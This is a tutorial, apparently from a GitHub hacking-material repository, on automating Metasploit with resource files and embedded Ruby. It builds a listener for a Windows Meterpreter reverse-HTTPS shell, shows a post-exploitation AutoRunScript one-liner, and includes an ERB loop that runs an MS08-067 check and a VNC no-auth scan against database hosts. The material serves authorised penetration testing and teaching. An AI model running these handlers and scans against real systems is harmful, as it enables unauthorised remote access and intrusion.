## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually, they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | API examples |
|-------|---|---|
| resource files | [resource files (examples)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-files-examples) |  run migrate -n wininit.exe |
| post exploitation | [post exploitation (rc)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#post-exploitation) | self.run_single("use auxiliary/scanner/vnc/vnc_none_auth") |
| erb scripting| [ERB scripting (ruby)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#erb-scripting-ruby) | run_single("services #{framework.datastore['RHOSTS']}") |

<br />

### Description:
<blockquote>The console (msfconsole or msf pro) supports basic automation using resource scripts. These scripts contain a set of console commands that are executed when the script loads. In addition to the basic console (core) commands, these scripts are also treated as ERB models. ERB is a way to embed Ruby code directly into a document. This allows you to call APIs that are not exposed through console commands and until you programmatically generate and return a list of commands based on your own logic. Resource scripts can be specified with the -r option for the Metasploit Console and runs automatically on startup if it exists. Resource scripts can also be run from the console prompt through the resource command (msf> resource file-to-run.rc)</blockquote>


<br />

## EXTERNAL LINKS

- [Rapid7 resource files](https://metasploit.help.rapid7.com/docs/resource-scripts)
- [INULBR metasploit-automatizacao](http://blog.inurl.com.br/2015/02/metasploit-automatizacao-resource-files_23.html#more)
- [Offensiveinfosec writing-resource-scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/)

---

<br /><br /><br />

## RESOURCE FILES EXAMPLES

- **Runing resource scripts**

      msfconsole -r my_resource_file.rc
      msfconsole -r /root/my_resource_file.rc
      msf > resource /root/my_resource_file.rc
      meterpreter > resource /root/my_resource_file.rc

<br />

<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands in a file, which can be used with the resource command.</blockquote>

- **Create a resource file to display the version number of metasploit (manually)**

  - [bash prompt]<br />

      touch my_resource_file.rc
      echo 'version' > my_resource_file.rc

- **Create a resource file to display the version number of metasploit (makerc)**

      [metasploit prompt]
      kali > msfconsole
      msf > version
      msf > makerc /root/my_resource_file.rc

<br />

<blockquote>In the next example we are going to write one handler resource file</blockquote>

- **Create a resource file using bash terminal prompt (bash)**

      touch my_resource_file.rc
         echo 'use exploit/multi/handler' > my_resource_file.rc
         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> my_resource_file.rc
         echo 'set LHOST 192.168.1.71' >> my_resource_file.rc
         echo 'set LPORT 666' >> my_resource_file.rc
         echo 'exploit' >> my_resource_file.rc

- **Create a resource file using the core command 'makerc'**<br />
'maekerc will build a resource file with the settings enter in msfconsole'

      kali > msfconsole
      msf > use exploit/multi/handler
      msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
      msf exploit(multi/handler) > set LHOST 192.168.1.71
      msf exploit(multi/handler) > set LPORT 666
      msf exploit(multi/handler) > exploit

      msf exploit(multi/handler) > makerc my_handler.rc

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## POST EXPLOITATION

- **AutoRunScript**

      sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_command -rc $IPATH/aux/$P0; exploit'

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## ERB SCRIPTING (ruby)

- **erb scripting**

      <ruby>
      framework.db.hosts.each do |h|
         h.services.each do |serv|
 
         if serv.port == 445 and h.os_flavor =~/XP|.NET Server|2003/i
                next if (serv.port != 445)
                print_good("#{h.address} seems to be Windows #{h.os_flavor}...")
                self.run_single("use exploit/windows/smb/ms08_067_netapi")
                print_good("Running ms08_067_netapi check against #{h.address}")
                self.run_single("set RHOST #{h.address}")
                self.run_single("check")
   
         elsif serv.port == 5900 and h.os_name =~/Linux/i
                next if (serv.port != 5900)
                print_good("#{h.address} seems to be Linux #{h.os_flavor}...")
                self.run_single("use auxiliary/scanner/vnc/vnc_none_auth")
                print_good("Running VNC no auth check against #{h.os_flavor}")
                self.run_single("set RHOSTS #{h.address}")
                self.run_single("run")
 
         else
                print_error("#{h.address} does not have port 445/5900 open")
                return nil 
         end
       end
      end
      </ruby>


#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />


